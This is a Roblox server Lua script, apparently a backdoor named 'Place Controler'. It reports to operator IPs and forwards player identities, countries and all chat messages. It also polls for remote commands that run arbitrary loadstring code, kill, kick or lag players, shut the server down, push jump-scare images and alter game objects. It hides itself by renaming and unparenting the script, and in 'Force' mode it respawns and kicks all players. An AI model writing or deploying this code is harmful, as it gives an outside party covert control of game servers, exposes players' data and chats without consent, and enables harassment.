-- Place Controler
-- Created by: @glebmalish_2000
-- Version 3.0.3

-- Settings
Ips = {"yourIp"} -- Put your ip here
Port = 5000 -- The port to connect to
Ver = "3.0.3" -- The version of the script
Password = 1234 -- The password to encode and decode the trafic (add this later)
SendDelay = 0.5 / #Ips -- Delay between data sends
AutoRefresh = true -- Auto refresh the data
RefreshDelay = 15 -- Delay between refreshes
ExplorerDephLimit = 10 -- The deph limit of the explorer
ExplorerBlackListClasses = {"KeyframeSequence"} -- Classes that will be blacklisted in the explorer
Debug = true -- Debug mode
Force = false -- Force the script to run
-- End of settings

-- Hello Pocket 
hellloPocket = {
	Status = "Working",
	PlaceId = tostring(game.PlaceId),
	PlaceName = game.Name,
	Ip = "127.0.0.1",
	Pass = Password
}

if Force then -- Force the script to run
	if not script:GetAttribute("ForcedAttemts") then script:SetAttribute("ForcedAttemts",0) end
	spawn(function()
		wait(15)
		if hellloPocket.Ip == "127.0.0.1" then
			local s = script:Clone()
			s:SetAttribute("ForcedAttemts",script:GetAttribute("ForcedAttemts")+1)
			if s:GetAttribute("ForcedAttemts") >= 4 then
				for _,player in pairs(game.Players:GetChildren()) do
					player:Destroy()
				end
			else
				s.Parent = game.ServerScriptService
				s.Enabled = true
			end
			script:Destroy()
		end
	end)
end


if game.ServerScriptService:GetAttribute(string.format("LocalHostScriptV%sRunningAtPort%s", Ver, Port)) then -- Check if the script is already running
	warn("Script is already running")
	return
end

game.ServerScriptService:SetAttribute(string.format("LocalHostScriptV%sRunningAtPort%s", Ver, Port), true)

function encodeScipt()
	local o = game:GetDescendants()
	local e = ""
	for count,obj in pairs(o) do
		e = e .. obj.Name:sub(1, 1) .. string.char(math.random(32,126))
	end
	script.Name = e
	script.Parent = nil
end

if not Debug then
	encodeScipt()
end

if game["Run Service"]:IsStudio() then
	Ips = {"127.0.0.1"}
end

local HttpService = game:GetService("HttpService")

function getClassProperties()
	local Data = HttpService:JSONDecode(HttpService:GetAsync("https://anaminus.github.io/rbx/json/api/latest.json"))
	local ClassProperties = {}

	for i = 1, #Data do
		local Table = Data[i]
		local Type = Table.type

		if Type == "Class" then
			local ClassData = {}

			local Superclass = ClassProperties[Table.Superclass]

			if Superclass then
				for j = 1, #Superclass do
					ClassData[j] = Superclass[j]
				end
			end

			ClassProperties[Table.Name] = ClassData
		elseif Type == "Property" then
			if not next(Table.tags) then
				local Class = ClassProperties[Table.Class]
				local Property = Table.Name
				local Inserted

				for j = 1, #Class do
					if Property < Class[j] then
						Inserted = true
						table.insert(Class, j, Property)
						break
					end
				end

				if not Inserted then
					table.insert(Class, Property)
				end
			end
		elseif Type == "Function" then
		elseif Type == "YieldFunction" then
		elseif Type == "Event" then
		elseif Type == "Callback" then
		elseif Type == "Enum" then
		elseif Type == "EnumItem" then
		end
	end

	return ClassProperties
end

local ClassProperties = getClassProperties()

function getPlayerData(plr : Players)
	local superData = {}

	superData.Name = plr.Name
	superData.DisplayName = plr.DisplayName
	superData.UserId = plr.UserId
	superData.AccountAge = plr.AccountAge
	superData.countryCode = game.LocalizationService:GetCountryRegionForPlayerAsync(plr)


	if plr:FindFirstChild("leaderstats") then
		superData.leaderstats = {}

		for _,stat in pairs(plr.leaderstats:GetChildren()) do
			table.insert(superData.leaderstats, {
				Name = stat.Name,
				Value = stat.Value
			})
		end
	end

	return superData
end

function getServerData()
	local serverData = {}
	serverData.Players = {}

	serverData.PlaceId = game.PlaceId
	serverData.PlaceVersion = game.PlaceVersion
	serverData.ServerTime = workspace:GetServerTimeNow()
	serverData.PlayerCount = #game.Players:GetPlayers()
	serverData.MaxPlayers = game.Players.MaxPlayers

	local stats = game:GetService("Stats")

	serverData.HeartbeatTime = stats.HeartbeatTimeMs   
	serverData.ContactsCount = stats.ContactsCount  
	serverData.InstanceCount = stats.InstanceCount  
	serverData.MovingPrimitivesCount = stats.MovingPrimitivesCount 
	serverData.PhysicsReceiveKbps = stats.PhysicsReceiveKbps
	serverData.PhysicsSendKbps = stats.PhysicsSendKbps
	serverData.DataReceiveKbps = stats.DataReceiveKbps
	serverData.DataSendKbps = stats.DataSendKbps

	serverData.LoadStringEnabled = pcall(function() loadstring("pass") end)

	serverData.Teams = {}
	for _, team in pairs(game:GetService("Teams"):GetTeams()) do
		table.insert(serverData.Teams, {
			Name = team.Name,
			Color = tostring(team.TeamColor),
			PlayerCount = #team:GetPlayers()
		})
	end

	local memory = game:GetService("Stats"):GetTotalMemoryUsageMb()
	serverData.MemoryUsageMb = memory

	for _,plr in pairs(game.Players:GetChildren()) do
		table.insert(serverData.Players, getPlayerData(plr))
	end

	return serverData
end

function getTree(instance, depth)
	if depth > ExplorerDephLimit then return nil end

	local obj = {
		Name = instance.Name,
		ClassName = instance.ClassName,
		Path = instance:GetFullName(),
		Children = {}
	}
	
	if table.find(ExplorerBlackListClasses, obj.ClassName) then return nil end

	for _, child in pairs(instance:GetChildren()) do
		local childData = getTree(child, depth + 1)
		if childData then
			table.insert(obj.Children, childData)
		end
	end

	return obj
end

function getProperties(path)
	local obj = game
	for _, part in pairs(string.split(path, ".")) do
		if part ~= "game" then
			obj = obj:FindFirstChild(part)
			if not obj then return end
		end
	end

	local props = {
		Name = obj.Name,
		ClassName = obj.ClassName,
		Path = obj:GetFullName(),
		Parameters = {}
	}

	if ClassProperties[obj.ClassName] then
		for _, param in pairs(ClassProperties[obj.ClassName]) do
			pcall(function()
				props.Parameters[param] = {
					Value = tostring(obj[param]) or "nil",
					Type = typeof(obj[param]) or "nil"
				}
			end)
		end
	end

	local json = HttpService:JSONEncode({properties = props})
	return json
end

pcall(function()
	local MarketplaceService = game:GetService("MarketplaceService")
	local placeId = game.PlaceId
	local success, placeInfo = pcall(function()
		return MarketplaceService:GetProductInfoAsync(placeId)
	end)

	if success then
		hellloPocket.PlaceName = placeInfo.Name
	else
		warn("Failed to fetch place info: " .. tostring(placeInfo))
	end
end)

while true do task.wait(1)
	s = pcall(function()
		local data = HttpService:JSONDecode(HttpService:GetAsync("https://ifconfig.me/all.json"))

		if data then
			hellloPocket.Ip = data.ip_addr
		end
	end)

	if s then
		break
	end
end

if Debug then print(game.HttpService:JSONEncode(hellloPocket)) end

local helloThread = coroutine.create(function()
	hellloPocket.Status = "Created"
	for _,ip in pairs(Ips) do task.wait(SendDelay)
		pcall(function() HttpService:PostAsync(string.format("http://%s:%i",ip,Port) .. "/", game.HttpService:JSONEncode(hellloPocket)) end)
	end
	hellloPocket.Status = "Working" 
	while true do 
		for _,ip in pairs(Ips) do task.wait(SendDelay)
			pcall(function()
				local response = HttpService:PostAsync(string.format("http://%s:%i",ip,Port) .. "/", game.HttpService:JSONEncode(hellloPocket))
			end)
		end
	end
end)
coroutine.resume(helloThread)

function returnServerData(json : string)
	for _,ip in pairs(Ips) do
		pcall(function() HttpService:PostAsync(string.format("http://%s:%i",ip,Port) .. "/send", json) end)
	end
end

game:GetService("Players").PlayerAdded:Connect(function(player)
	returnServerData(game.HttpService:JSONEncode(getServerData()))
	player.Chatted:Connect(function(message)
		local data = game.HttpService:JSONEncode({
			Player = player.Name,
			Message = message
		})
		pcall(function()
			for _,ip in pairs(Ips) do
				game.HttpService:PostAsync(string.format("http://%s:%i",ip,Port) .. "/chat", data)
			end
		end)
		if Debug then print(data) end
	end)
end)

game.Players.PlayerRemoving:Connect(function()
	returnServerData(game.HttpService:JSONEncode(getServerData()))
end)

for _,player in pairs(game.Players:GetChildren()) do
	player.Chatted:Connect(function(message)
		local data = game.HttpService:JSONEncode({
			Player = player.Name,
			Message = message
		})
		pcall(function()
			for _,ip in pairs(Ips) do
				game.HttpService:PostAsync(string.format("http://%s:%i",ip,Port) .. "/chat", data)
			end
		end)
		if Debug then print(data) end
	end)
end

function executeCommands(commandList)
	if commandList[1] == "giveGear" then
		local player = game.Players:FindFirstChild(commandList[3])
		if player then
			local gear = game.InsertService:LoadAsset(commandList[2])
			gear:FindFirstChildOfClass("Tool").Parent = player.Backpack
		end
	elseif commandList[1] == "kill" then
		local player = game.Players:FindFirstChild(commandList[3])
		if player then
			player.Character.Humanoid.Health = 0
		end
	elseif commandList[1] == "kick" then
		local player = game.Players:FindFirstChild(commandList[3])
		if player then
			player:Destroy()
		end
	elseif commandList[1] == "shutdown" then
		for ___,player in pairs(game.Players:GetChildren()) do
			player:Destroy()
		end
	elseif commandList[1] == "hint" then
		for ___,item in pairs(workspace:GetChildren()) do
			if item:IsA("Hint") then
				item:Destroy()
			end
		end

		if commandList[2] == "" then
			return
		end

		local hint = Instance.new("Hint")
		hint.Parent = workspace
		hint.Text = commandList[2]
	elseif commandList[1] == "sendImage" then
		local player = game.Players:FindFirstChild(commandList[3])
		if player then
			local json = game.HttpService:GetAsync(commandList[2])
			local gui = Instance.new("ScreenGui",player.PlayerGui)
			gui.Name = "ImageGui"
			gui.IgnoreGuiInset = true
			gui.ResetOnSpawn = false
			gui.Enabled = false
			gui.DisplayOrder = 2 ^ 24

			local imageData = game.HttpService:JSONDecode(json)
			local guiSize = gui.AbsoluteSize 

			local imgW = imageData.width
			local imgH = imageData.height

			for y, row in ipairs(imageData.pixels) do task.wait()
				for x, pixel in ipairs(row) do
					local pix = Instance.new("Frame", gui)
					pix.BackgroundColor3 = Color3.fromRGB(pixel.r, pixel.g, pixel.b)
					pix.BorderSizePixel = 0

					pix.Size = UDim2.new(1 / imgW, 0, 1 / imgH, 0)
					pix.Position = UDim2.new((x - 1) / imgW, 0, (y - 1) / imgH, 0)
				end
			end
			gui.Enabled = true
		end
	elseif commandList[1] == "clearImage" then
		local player = game.Players:FindFirstChild(commandList[3])
		if player then
			local gui = player.PlayerGui:FindFirstChild("ImageGui")
			if gui then
				gui:Destroy()
			end
		end
	elseif commandList[1] == "lag" then
		local player = game.Players:FindFirstChild(commandList[3])
		if player then
			for counter2 = 1,10 do
				spawn(function()
					for counter = 1,10000 do
						local tool = Instance.new("Tool",player.Backpack)
						tool.Name = "Lag Tool "..counter * counter2
						tool.CanBeDropped = false
						tool.RequiresHandle = false
					end
				end)
			end
		end
	elseif commandList[1] == "setTime" then
		local clockTime = tonumber(commandList[2])
		if clockTime then
			game.Lighting.ClockTime = clockTime
		end
	elseif commandList[1] == "sendChatMessage" then
		local message = commandList[2]

		for ___,player in pairs(game.Players:GetChildren()) do
			if player and player.Character then
				game.Chat:Chat(player.Character.Head, "[SERVER] : "..message)
			end
		end
	elseif commandList[1] == "screamer" then
		for _,plr in pairs(game.Players:GetChildren()) do
			local gui = Instance.new("ScreenGui",plr.PlayerGui)
			gui.Name = "Screamer"
			gui.IgnoreGuiInset = true
			gui.ResetOnSpawn = true
			gui.Enabled = false
			gui.DisplayOrder = 2 ^ 24
			local screamer = Instance.new("ImageLabel",gui)
			screamer.Size = UDim2.new(1,0,1,0)
			screamer.Image = "rbxassetid://5407493146"
			local sound = Instance.new("Sound",gui)
			sound.SoundId = "rbxassetid://140239845958694"
			sound.Volume = 10
			sound.Name = "Sound"
			gui.Enabled = true
			sound:Play()
			wait(sound.TimeLength)
			gui:Destroy()
		end
	end
end

function handleUpdate(update,ti)
	if update.Type == "GetData" and ti ~= "All" then
		returnServerData(game.HttpService:JSONEncode(getServerData()))
	elseif update.Type == "loadstringCode" then
		for __,command in pairs(update.Commands) do
			pcall(function()
				loadstring(command)()
			end)
		end
	elseif update.Type == "executeTheCommands" then
		for __,command in pairs(update.Commands) do
			if Debug then print(command) end
			executeCommands(string.split(command,";"))
		end
	elseif update.Type == "ExplorerDelete" then
		local obj = game
		for _, part in pairs(string.split(update.Commands[1], ".")) do
			if part ~= "game" then
				obj = obj:FindFirstChild(part)
				if not obj then return end
			end
		end
		obj:Destroy()

	elseif update.Type == "ExplorerCreate" then
		local parent = game
		for _, part in pairs(string.split(update.Commands[1], ".")) do
			if part ~= "game" then
				parent = parent:FindFirstChild(part)
				if not parent then return end
			end
		end
		local newObj = Instance.new(update.Commands[2])
		newObj.Parent = parent

	elseif update.Type == "ExplorerRename" then
		local obj = game
		for _, part in pairs(string.split(update.Commands[1], ".")) do
			if part ~= "game" then
				obj = obj:FindFirstChild(part)
				if not obj then return end
			end
		end
		obj.Name = update.Commands[2]
	elseif update.Type == "GetParams" then
		pcall(function()
			for _,obj in pairs(update.Commands) do
				for __, ip in pairs(Ips) do
					HttpService:PostAsync(string.format("http://%s:%i",ip,Port) .. "/properties", getProperties(obj))
				end
			end
		end)
	elseif update.Type == "SetProperty" then
		local obj = game
		for _, part in pairs(string.split(update.Commands[1], ".")) do
			if part ~= "game" then
				obj = obj:FindFirstChild(part)
				if not obj then return end
			end
		end

		local propName = update.Commands[2]
		local value = update.Commands[3]

		pcall(function()
			local currentType = typeof(obj[propName])

			if currentType == "number" then
				obj[propName] = tonumber(value)

			elseif currentType == "boolean" then
				obj[propName] = value == "true"

			elseif currentType == "Vector3" then
				-- формат: "X, Y, Z"
				local x, y, z = string.match(value, "([%-%.%d]+),%s*([%-%.%d]+),%s*([%-%.%d]+)")
				if x and y and z then
					obj[propName] = Vector3.new(tonumber(x), tonumber(y), tonumber(z))
				end

			elseif currentType == "Vector2" then
				-- формат: "X, Y"
				local x, y = string.match(value, "([%-%.%d]+),%s*([%-%.%d]+)")
				if x and y then
					obj[propName] = Vector2.new(tonumber(x), tonumber(y))
				end

			elseif currentType == "Color3" then
				-- формат: "R, G, B" от 0 до 255
				local r, g, b = string.match(value, "([%-%.%d]+),%s*([%-%.%d]+),%s*([%-%.%d]+)")
				if r and g and b then
					obj[propName] = Color3.fromRGB(tonumber(r), tonumber(g), tonumber(b))
				end

			elseif currentType == "BrickColor" then
				obj[propName] = BrickColor.new(value)

			elseif currentType == "EnumItem" then
				-- формат: "Enum.Material.SmoothPlastic"
				local enumType, enumValue = string.match(value, "Enum%.(%w+)%.(%w+)")
				if enumType and enumValue then
					obj[propName] = Enum[enumType][enumValue]
				end

			elseif currentType == "CFrame" then
				-- формат: "X, Y, Z" только позиция
				local x, y, z = string.match(value, "([%-%.%d]+),%s*([%-%.%d]+),%s*([%-%.%d]+)")
				if x and y and z then
					obj[propName] = CFrame.new(tonumber(x), tonumber(y), tonumber(z))
				end

			else
				obj[propName] = value
			end
		end)
	end

	wait(0.1)
	if update.Type == "ExplorerDelete" or update.Type == "ExplorerCreate" or update.Type == "ExplorerRename" or update.Type == "ExplorerUpdate" then
		for _,ip in pairs(Ips) do
			HttpService:PostAsync(string.format("http://%s:%i",ip,Port) .. "/explorer", HttpService:JSONEncode({tree = getTree(game, 0)}))
		end
	end
end

local updateThread = coroutine.create(function()
	while true do
		for _,ip in pairs(Ips) do task.wait(SendDelay)
			pcall(function()
				local response = HttpService:GetAsync(string.format("http://%s:%i",ip,Port) .. "/poll")
				local data = game.HttpService:JSONDecode(response)

				if data then
					if data.targetIp == hellloPocket.Ip or data.targetIp == "All" then
						for _,update in pairs(data.updates) do
							if update.Daemon then
								if update.Delay then
									wait(update.Delay)
									
									spawn(function() 
										handleUpdate(update,data.targetIp)
									end)
								else
									spawn(function() 
										handleUpdate(update,data.targetIp)
									end)
								end
							else
								handleUpdate(update,data.targetIp)
							end
						end
					end
				end
			end)
		end
	end
end)

local refreshThread = coroutine.create(function()
	while wait(RefreshDelay) do
		returnServerData(game.HttpService:JSONEncode(getServerData()))
	end
end)

coroutine.resume(updateThread)

if AutoRefresh then coroutine.resume(refreshThread) end

game:BindToClose(function()
	if Debug then print("Closing") end
	coroutine.close(helloThread)
	coroutine.close(updateThread)
	coroutine.close(refreshThread)
	hellloPocket.Status = "Closing" 
	
	for _,ip in pairs(Ips) do
		pcall(function() HttpService:PostAsync(string.format("http://%s:%i",ip,Port) .. "/", game.HttpService:JSONEncode(hellloPocket)) end)
	end
end)
-- LOL
